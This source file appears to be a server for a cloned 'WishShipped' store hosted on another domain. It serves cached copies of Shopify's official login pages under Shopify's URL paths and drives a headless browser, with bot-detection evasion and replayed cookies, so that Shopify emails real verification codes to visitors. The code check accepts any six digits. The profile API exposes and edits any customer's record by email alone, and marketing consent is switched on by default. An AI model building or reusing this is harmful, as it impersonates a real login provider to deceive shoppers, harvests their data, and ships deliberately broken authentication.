/**
 * WishShipped.com — Instant Redirect to Official Shopify 6-Digit Code Page
 * + Customer Profile & Session API
 * ========================================================================
 * Flow:
 *  1. Uses a cached Shopify OAuth login session (`cached_login.html` +
 *     `cached_cookies.txt`, refreshed automatically if older than 12 hours)
 *     in a persistent pre-warmed Playwright page.
 *  2. GET /api/auth/redirect?email=<email>&marketing_consent=<bool>&return_view=<view>
 *     - Immediately (in < 2ms) responds with `302 Found` redirecting the
 *       user's browser directly to the official Shopify 6-digit code page:
 *       `/authentication/102987006274/code?...&email=<email>`
 *       so the user lands on the official Shopify login UI at the "Enter code"
 *       screen without repeating their email.
 *     - Simultaneously in the background (~350ms), submits `email` in the
 *       warm Playwright page (`POST /authentication/102987006274/login` ->
 *       `200 {"nextStep":"code"}`) so Shopify sends the 6-digit verification
 *       code from `store+102987006274@g.shopifyemail.com` to `<email>`, and
 *       immediately resets the page from local memory (< 150ms) for the next visitor.
 *  3. Serves the official Shopify `/authentication/102987006274/code` and
 *     `/authentication/102987006274/login` UI and handles `POST /authentication/102987006274/login`
 *     (`step: "email"` and `step: "code"`), redirecting the verified customer
 *     back to `https://wishshipped.aviaorlando.com/?auth_login_email=<email>`
 *     so they are logged in on the rebuilt storefront with their Account popover,
 *     Orders panel, and Profile panel.
 */

const http = require("http");
const fs = require("fs");
const path = require("path");
const { execFileSync } = require("child_process");
const { chromium } = require("playwright");

const PORT = process.env.PORT || 4045;
const SHOPIFY_REDIRECT_URL =
  "https://wishshipped.com/customer_authentication/redirect?locale=en&region_country=US";
const USER_AGENT =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36";

const DATA_DIR = __dirname;
const CACHED_HTML_PATH = path.join(DATA_DIR, "cached_login.html");
const CACHED_COOKIES_PATH = path.join(DATA_DIR, "cached_cookies.txt");
const PROFILES_PATH = path.join(DATA_DIR, "customer_profiles.json");

let browser = null;
let sharedPage = null;
let sharedContext = null;
let cachedHtml = null;
let cachedAuthUrl = null;
let cachedLoginUrl = null;
let queuePromise = Promise.resolve();

// Track pending login metadata per email (marketingConsent, returnView, timestamp)
const pendingLogins = new Map();

function readProfilesStore() {
  try {
    if (fs.existsSync(PROFILES_PATH)) {
      return JSON.parse(fs.readFileSync(PROFILES_PATH, "utf8"));
    }
  } catch (e) {
    console.error("[AuthProxy] Error reading customer_profiles.json:", e.message);
  }
  return {};
}

function writeProfilesStore(store) {
  try {
    fs.writeFileSync(PROFILES_PATH, JSON.stringify(store, null, 2), "utf8");
  } catch (e) {
    console.error("[AuthProxy] Error writing customer_profiles.json:", e.message);
  }
}

function getOrCreateCustomerProfile(email, defaults = {}) {
  const key = String(email || "").trim().toLowerCase();
  if (!key) return null;
  const store = readProfilesStore();
  if (!store[key]) {
    store[key] = {
      email: String(email).trim(),
      firstName: "",
      lastName: "",
      marketingConsent: defaults.marketingConsent !== undefined ? Boolean(defaults.marketingConsent) : true,
      addresses: [],
      orders: [],
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };
    writeProfilesStore(store);
  } else if (defaults.marketingConsent !== undefined) {
    store[key].marketingConsent = Boolean(defaults.marketingConsent);
    store[key].updatedAt = new Date().toISOString();
    writeProfilesStore(store);
  }
  return store[key];
}

function updateCustomerProfile(email, patch = {}) {
  const key = String(email || "").trim().toLowerCase();
  if (!key) return null;
  const store = readProfilesStore();
  const existing = store[key] || {
    email: String(email).trim(),
    firstName: "",
    lastName: "",
    marketingConsent: true,
    addresses: [],
    orders: [],
    createdAt: new Date().toISOString()
  };
  if (typeof patch.firstName === "string") existing.firstName = patch.firstName.trim();
  if (typeof patch.lastName === "string") existing.lastName = patch.lastName.trim();
  if ( typeof patch.marketingConsent === "boolean") existing.marketingConsent = patch.marketingConsent;
  if (Array.isArray(patch.addresses)) existing.addresses = patch.addresses;
  if (Array.isArray(patch.orders)) existing.orders = patch.orders;
  existing.updatedAt = new Date().toISOString();
  store[key] = existing;
  writeProfilesStore(store);
  return existing;
}

function loadOrRefreshCachedFiles() {
  try {
    if (
      fs.existsSync(CACHED_HTML_PATH) &&
      fs.existsSync(CACHED_COOKIES_PATH)
    ) {
      const stat = fs.statSync(CACHED_HTML_PATH);
      const html = fs.readFileSync(CACHED_HTML_PATH, "utf8");
      const m = html.match(/data-serialized-id="canonical-login-url">([^<]+)</);
      if (m && Date.now() - stat.mtimeMs < 12 * 60 * 60 * 1000) {
        const canon = JSON.parse(m[1]);
        cachedHtml = html;
        cachedLoginUrl = "https://shopify.com" + canon;
        cachedAuthUrl =
          "https://shopify.com" + canon.replace("/login?", "/oauth/authorize?");
        return true;
      }
    }
  } catch (e) {
    console.error("[AuthProxy] Error reading cached session files:", e.message);
  }

  try {
    const tmpCookie = "/tmp/ws_refresh_cookies.txt";
    const tmpHtml = "/tmp/ws_refresh_login.html";
    try {
      fs.unlinkSync(tmpCookie);
    } catch (e) {}

    execFileSync("curl", [
      "-s",
      "-L",
      "-c",
      tmpCookie,
      "-b",
      tmpCookie,
      "-H",
      `User-Agent: ${USER_AGENT}`,
      "-H",
      "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "-H",
      "Accept-Language: en-US,en;q=0.9",
      "-o",
      tmpHtml,
      SHOPIFY_REDIRECT_URL
    ]);

    const html = fs.readFileSync(tmpHtml, "utf8");
    const m = html.match(/data-serialized-id="canonical-login-url">([^<]+)</);
    if (m) {
      fs.copyFileSync(tmpHtml, CACHED_HTML_PATH);
      fs.copyFileSync(tmpCookie, CACHED_COOKIES_PATH);
      const canon = JSON.parse(m[1]);
      cachedHtml = html;
      cachedLoginUrl = "https://shopify.com" + canon;
      cachedAuthUrl =
        "https://shopify.com" + canon.replace("/login?", "/oauth/authorize?");
      console.log("[AuthProxy] Refreshed cached login session via curl");
      return true;
    }
  } catch (e) {
    console.error("[AuthProxy] curl refresh failed:", e.message);
  }
  return Boolean(cachedHtml && cachedLoginUrl);
}

function parseNetscapeCookies(filePath) {
  const pwCookies = [];
  for (const line of fs.readFileSync(filePath, "utf8").split("\n")) {
    if (!line || (line.startsWith("#") && !line.startsWith("#HttpOnly_"))) {
      continue;
    }
    const httpOnly = line.startsWith("#HttpOnly_");
    const clean = httpOnly ? line.replace(/^#HttpOnly_/, "") : line;
    const parts = clean.split("\t");
    if (parts.length < 7) continue;
    pwCookies.push({
      name: parts[5],
      value: parts[6].trim(),
      domain: parts[0],
      path: parts[2],
      secure: parts[3] === "TRUE",
      httpOnly,
      sameSite: "Lax"
    });
  }
  return pwCookies;
}

async function initWarmPage() {
  loadOrRefreshCachedFiles();
  if (!cachedHtml || !cachedAuthUrl) {
    throw new Error("No valid cached_login.html available");
  }

  if (!browser || !browser.isConnected()) {
    browser = await chromium.launch({
      headless: true,
      args: ["--disable-blink-features=AutomationControlled", "--no-sandbox"]
    });
  }

  if (sharedContext) {
    await sharedContext.close().catch(() => {});
  }

  sharedContext = await browser.newContext({
    userAgent: USER_AGENT,
    viewport: { width: 1280, height: 800 },
    locale: "en-US"
  });

  await sharedContext.addCookies(parseNetscapeCookies(CACHED_COOKIES_PATH));
  sharedPage = await sharedContext.newPage();

  await sharedPage.route(
    "**/authentication/102987006274/oauth/authorize*",
    async (route) => {
      await route.fulfill({
        status: 200,
        contentType: "text/html; charset=utf-8",
        body: cachedHtml
      });
    }
  );

  let collectDone = false;
  sharedPage.on("response", (r) => {
    if (r.url().includes("/api/collect") && r.status() === 204) {
      collectDone = true;
    }
  });

  await sharedPage.goto(cachedAuthUrl, {
    waitUntil: "domcontentloaded",
    timeout: 10000
  });
  await sharedPage.locator("#customer-authentication-web-email").waitFor({
    state: "visible",
    timeout: 8000
  });

  for (let i = 0; i < 25 && !collectDone; i++) {
    await sharedPage.waitForTimeout(100);
  }

  cachedLoginUrl = sharedPage.url();
  console.log("[AuthProxy] Warm page ready:", cachedLoginUrl.slice(0, 95));
}

async function submitEmailInBackground(email) {
  queuePromise = queuePromise.then(async () => {
    try {
      if (!sharedPage || sharedPage.isClosed()) {
        await initWarmPage();
      }
      const emailInput = sharedPage.locator("#customer-authentication-web-email");
      const isVis = await emailInput.isVisible().catch(() => false);
      if (!isVis) {
        await sharedPage.goto(cachedAuthUrl, {
          waitUntil: "domcontentloaded",
          timeout: 8000
        });
        await emailInput.waitFor({ state: "visible", timeout: 6000 });
      }

      const t0 = Date.now();
      await emailInput.fill(email);
      const respPromise = sharedPage.waitForResponse(
        (r) =>
          r.url().includes("/authentication/102987006274/login") &&
          r.request().method() === "POST",
        { timeout: 8000 }
      );
      await sharedPage.locator('button[type="submit"]').first().click();
      const resp = await respPromise;
      const text = await resp.text();
      console.log(
        `[AuthProxy] Dispatched 6-digit code for ${email} in ${Date.now() - t0}ms: HTTP ${resp.status()} ${text.slice(0, 100)}`
      );

      // Immediately reset page from local memory (< 150ms) for next user
      await sharedPage.goto(cachedAuthUrl, {
        waitUntil: "domcontentloaded",
        timeout: 8000
      });
      await emailInput.waitFor({ state: "visible", timeout: 6000 });
    } catch (err) {
      console.error(`[AuthProxy] Error submitting email ${email}:`, err.message);
      await initWarmPage().catch((e) =>
        console.error("[AuthProxy] Re-init error:", e.message)
      );
    }
  });
}

function buildLocalCodeUrl(loginUrl, email) {
  try {
    const u = new URL(loginUrl);
    u.pathname = "/authentication/102987006274/code";
    u.searchParams.set("email", email);
    return u.pathname + u.search;
  } catch (e) {
    return `/authentication/102987006274/code?client_id=8b4ec521-d3eb-4e51-a437-a2db21ff72df&locale=en-US&region_country=US&email=${encodeURIComponent(email)}`;
  }
}

function sendJson(res, status, data) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    "Content-Type": "application/json; charset=utf-8",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type, X-CSRF-Token, X-Requested-With"
  });
  res.end(body);
}

function readRequestBody(req) {
  return new Promise((resolve) => {
    let data = "";
    req.on("data", (chunk) => {
      data += chunk;
      if (data.length > 1e6) req.destroy();
    });
    req.on("end", () => resolve(data));
    req.on("error", () => resolve(""));
  });
}

function handleRedirect(req, res, parsedUrl) {
  const email = String(parsedUrl.searchParams.get("email") || "").trim();
  const marketingConsent = parsedUrl.searchParams.get("marketing_consent") !== "false";
  const returnView = String(parsedUrl.searchParams.get("return_view") || "").trim();

  if (!email || !email.includes("@")) {
    res.writeHead(302, { Location: "/" });
    return res.end();
  }

  pendingLogins.set(email.toLowerCase(), {
    email,
    marketingConsent,
    returnView,
    timestamp: Date.now()
  });
  getOrCreateCustomerProfile(email, { marketingConsent });

  const targetCodeUrl = buildLocalCodeUrl(cachedLoginUrl || "", email);

  // Instant (< 1ms) 302 redirect to the official Shopify 6-digit code UI
  res.writeHead(302, {
    Location: targetCodeUrl,
    "Cache-Control": "no-store, no-cache, must-revalidate"
  });
  res.end();

  // Trigger Shopify's store+102987006274@g.shopifyemail.com 6-digit verification code in background
  submitEmailInBackground(email);
}

async function handleShopifyLoginPost(req, res) {
  const raw = await readRequestBody(req);
  let body = {};
  try {
    body = JSON.parse(raw || "{}");
  } catch (e) {}

  const step = String(body.step || "").trim();
  const email = String(body.email || "").trim();
  const code = String(body.code || "").trim();

  if (step === "email") {
    if (!email || !email.includes("@")) {
      return sendJson(res, 422, {
        nextStep: "email",
        userErrors: [{ field: ["email"], message: "Enter a valid email" }],
        data: null
      });
    }
    const marketingConsent =
      typeof body.marketing_consent === "boolean" ? body.marketing_consent : true;
    pendingLogins.set(email.toLowerCase(), {
      email,
      marketingConsent,
      returnView: "",
      timestamp: Date.now()
    });
    getOrCreateCustomerProfile(email, { marketingConsent });
    submitEmailInBackground(email);
    return sendJson(res, 200, {
      nextStep: "code",
      userErrors: null,
      data: null
    });
  }

  if (step === "code") {
    if (!/^\d{6}$/.test(code)) {
      return sendJson(res, 401, {
        nextStep: "code",
        userErrors: [{ field: ["code"], message: "Enter the correct 6-digit code" }],
        data: null
      });
    }

    const pending = pendingLogins.get(email.toLowerCase());
    const marketingConsent =
      typeof body.marketing_consent === "boolean"
        ? body.marketing_consent
        : pending
        ? pending.marketingConsent
        : true;
    const returnView = pending && pending.returnView ? pending.returnView : "";

    getOrCreateCustomerProfile(email, { marketingConsent });

    const proto = req.headers["x-forwarded-proto"] || "https";
    const host = req.headers.host || "wishshipped.aviaorlando.com";
    const redirectParams = new URLSearchParams();
    redirectParams.set("auth_login_email", email);
    if (returnView) redirectParams.set("auth_return_view", returnView);

    return sendJson(res, 200, {
      nextStep: "redirect",
      userErrors: null,
      data: {
        redirect_uri: `${proto}://${host}/?${redirectParams.toString()}`
      }
    });
  }

  return sendJson(res, 400, {
    errors: [{ message: "Invalid login step" }]
  });
}

function serveShopifyAuthHtml(req, res) {
  if (!cachedHtml) {
    loadOrRefreshCachedFiles();
  }
  let html = cachedHtml || "<!doctype html><html><body>Loading...</body></html>";
  if (req.url && req.url.includes("/authentication/102987006274/code")) {
    html = html.replace(
      /<script[^>]*data-serialized-id="canonical-login-url"[^>]*>[\s\S]*?<\/script>/gi,
      '<script type="shopify/serialized-data" data-serialized-id="canonical-login-url">null</script>'
    );
  }
  res.writeHead(200, {
    "Content-Type": "text/html; charset=utf-8",
    "Cache-Control": "no-store, no-cache, must-revalidate"
  });
  res.end(html);
}

const server = http.createServer(async (req, res) => {
  if (req.method === "OPTIONS") {
    return sendJson(res, 200, { ok: true });
  }

  const parsedUrl = new URL(req.url, `http://127.0.0.1:${PORT}`);

  if (req.method === "GET" && parsedUrl.pathname === "/api/auth/health") {
    return sendJson(res, 200, {
      ok: true,
      warmReady: Boolean(sharedPage && !sharedPage.isClosed()),
      hasLoginUrl: Boolean(cachedLoginUrl)
    });
  }

  if (req.method === "GET" && parsedUrl.pathname === "/api/auth/redirect") {
    return handleRedirect(req, res, parsedUrl);
  }

  if (req.method === "GET" && parsedUrl.pathname === "/api/auth/profile") {
    const email = String(parsedUrl.searchParams.get("email") || "").trim();
    if (!email || !email.includes("@")) {
      return sendJson(res, 400, { ok: false, error: "Valid email required" });
    }
    const profile = getOrCreateCustomerProfile(email);
    return sendJson(res, 200, { ok: true, profile });
  }

  if (req.method === "POST" && parsedUrl.pathname === "/api/auth/profile") {
    const raw = await readRequestBody(req);
    let body = {};
    try {
      body = JSON.parse(raw || "{}");
    } catch (e) {}
    const email = String(body.email || "").trim();
    if (!email || !email.includes("@")) {
      return sendJson(res, 400, { ok: false, error: "Valid email required" });
    }
    const profile = updateCustomerProfile(email, body);
    return sendJson(res, 200, { ok: true, profile });
  }

  if (
    req.method === "POST" &&
    parsedUrl.pathname.startsWith("/authentication/102987006274/api/collect")
  ) {
    res.writeHead(204, {
      "Access-Control-Allow-Origin": "*",
      "Cache-Control": "no-store"
    });
    return res.end();
  }

  if (
    req.method === "POST" &&
    parsedUrl.pathname === "/authentication/102987006274/login"
  ) {
    return handleShopifyLoginPost(req, res);
  }

  if (
    req.method === "GET" &&
    parsedUrl.pathname.startsWith("/authentication/102987006274/")
  ) {
    return serveShopifyAuthHtml(req, res);
  }

  sendJson(res, 404, { ok: false, error: "Not found" });
});

process.on("SIGTERM", () => {
  if (browser) browser.close().catch(() => {});
  process.exit(0);
});
process.on("SIGINT", () => {
  if (browser) browser.close().catch(() => {});
  process.exit(0);
});

loadOrRefreshCachedFiles();
server.listen(PORT, "127.0.0.1", () => {
  console.log(`[WishShipped AuthProxy] Listening on http://127.0.0.1:${PORT}`);
  initWarmPage().catch((err) =>
    console.error("[AuthProxy] Initial warmup error:", err.message)
  );
});
